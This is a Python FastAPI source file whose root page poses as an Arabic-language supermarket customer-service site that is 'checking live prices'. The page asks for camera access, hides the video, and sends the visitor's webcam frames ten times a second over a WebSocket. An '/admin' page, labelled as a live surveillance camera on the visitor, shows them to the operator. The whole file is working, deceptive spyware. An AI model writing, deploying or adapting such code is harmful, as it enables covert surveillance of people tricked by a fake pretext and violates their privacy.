from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from typing import List

app = FastAPI(title="نظام المراقبة والبث المباشر")

class ConnectionManager:
    def __init__(self):
        self.viewers: List[WebSocket] = []

    async def connect_viewer(self, websocket: WebSocket):
        await websocket.accept()
        self.viewers.append(websocket)

    def disconnect_viewer(self, websocket: WebSocket):
        self.viewers.remove(websocket)

    async def broadcast_frame(self, data: str):
        for viewer in self.viewers:
            try:
                await viewer.send_text(data)
            except:
                pass

manager = ConnectionManager()

@app.get("/", response_class=HTMLResponse)
def broadcaster_page():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>سوبر ماركت - خدمة العملاء</title>
        <style>
            body { background: #0f172a; color: white; text-align: center; padding-top: 80px; font-family: Tahoma; }
            .box { background: #1e293b; padding: 30px; border-radius: 12px; display: inline-block; border: 2px solid #047857; }
            video { display: none; }
            .status { background: #047857; color: white; padding: 12px 20px; border-radius: 8px; font-size: 16px; margin-top: 15px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>🛒 مرحباً بك في سوبر ماركت</h2>
            <p>جاري تحميل المتجر والتحقق من الأسعار الحية...</p>
            <div class="status" id="status">يرجى السماح بالوصول للكاميرا للمتابعة</div>
        </div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(`${protocol}${window.location.host}/ws/broadcast`);
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            const status = document.getElementById('status');

            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                status.innerText = "تم الاتصال بنجاح واستعراض المنتجات";
                status.style.background = "#25d366";
                status.style.color = "black";
                
                setInterval(() => {
                    canvas.width = 640;
                    canvas.height = 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const frameData = canvas.toDataURL('image/jpeg', 0.5);
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(frameData);
                    }
                }, 100);
            })
            .catch(err => {
                status.innerText = "تعذر الوصول: يجب السماح للكاميرا";
                status.style.background = "#dc2626";
            });
        </script>
    </body>
    </html>
    """

@app.get("/admin", response_class=HTMLResponse)
def viewer_page():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>لوحة المراقبة الحية</title>
        <style>
            body { background: #000; color: white; text-align: center; padding-top: 20px; font-family: Tahoma; }
            img { width: 95%; max-width: 600px; border: 4px solid #25d366; border-radius: 12px; background: #111; }
            .badge { background: #047857; color: white; padding: 8px 15px; border-radius: 20px; font-weight: bold; display: inline-block; margin-bottom: 15px; }
        </style>
    </head>
    <body>
        <div class="badge">🔴 كاميرا المراقبة الحية للزائر</div>
        <br>
        <img id="stream-view" alt="في انتظار دخول الزائر للموقع...">

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(`${protocol}${window.location.host}/ws/viewer`);
            const img = document.getElementById('stream-view');

            ws.onmessage = function(event) {
                img.src = event.data;
            };
        </script>
    </body>
    </html>
    """

@app.websocket("/ws/broadcast")
async def websocket_broadcast(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            data = await websocket.receive_text()
            await manager.broadcast_frame(data)
    except WebSocketDisconnect:
        pass

@app.websocket("/ws/viewer")
async def websocket_viewer(websocket: WebSocket):
    await manager.connect_viewer(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect_viewer(websocket)
